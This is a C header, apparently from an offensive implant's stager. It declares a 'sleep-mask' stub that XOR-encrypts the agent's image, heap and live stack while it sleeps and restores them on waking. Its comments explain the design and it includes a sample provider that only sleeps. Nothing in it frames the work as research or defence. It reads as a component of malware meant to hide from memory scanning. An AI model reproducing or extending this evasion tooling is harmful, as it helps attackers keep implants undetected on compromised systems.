#ifndef STAGER_MASK_H
#define STAGER_MASK_H

#include <stddef.h>
#include <stdint.h>

#include "stager_iface.h"

/*
 * Sleep-mask stub for the stager.
 *
 * The mask code lives in the stager mapping, not in the agent image, so it can
 * keep running while the agent image is XORed. stager_mask_publish() places
 * the entry point in the GS state block installed by the stager, and the agent
 * reads it at startup. The agent must have stopped or joined every other
 * thread first: this function masks in place and does not suspend the caller.
 *
 * The agent reports its stack pointer and readiness in the published ABI block
 * before each call. The wrapper switches to the stager's dedicated mask stack
 * and calls the provider. The default provider encrypts agent-owned memory
 * (anonymous ELF images, [heap], the live part of the agent stack), sleeps,
 * restores it and returns. The unused part of the stack mapping is dropped
 * instead of encrypted, so a large loader-allocated stack does not inflate the
 * mask window. Runtime TLS/libc/stager mappings and the stub's state/stack
 * remain usable while the agent is masked.
 */

/* Publish the mask entry point in the stager state block (mask.c). */
void stager_mask_publish(void);

/*
 * Run the provider on the stager's dedicated stack. `keep_start..keep_end` is
 * the state+stack mapping that must stay untouched. Exported for the mask
 * test, which supplies its own stack; production callers use
 * stager_mask_sleep().
 */
int stager_mask_run_on_stack(unsigned seconds, uintptr_t probe, void *stack_top,
                             uintptr_t keep_start, uintptr_t keep_end);

/*
 * Provider contract (mask_<name>.c, selected with MASK=<name>):
 * mask the chosen agent-owned ranges except `keep_start..keep_end`, sleep, and
 * restore them. `probe` is the stack pointer from the agent's published mask
 * report; a provider that masks the stack can use it to bound the live frames.
 * Runs on the dedicated stub stack, so it may mask the agent's stack. The
 * provider is free to mmap its own scratch. 0 on success. The common wrapper
 * drops the spent payload blob once the agent reports ready.
 *
 * A minimal provider can simply sleep:
 *
 *   int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
 *                                  uintptr_t keep_start, uintptr_t keep_end) {
 *     (void)probe; (void)keep_start; (void)keep_end;
 *     struct { long sec, nsec; } ts = {(long)seconds, 0};
 *     while (syscall2(SYS_nanosleep, (long)&ts, (long)&ts) == -4) {}
 *     return 0;
 *   }
 */
int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
                               uintptr_t keep_start, uintptr_t keep_end);

#endif /* STAGER_MASK_H */
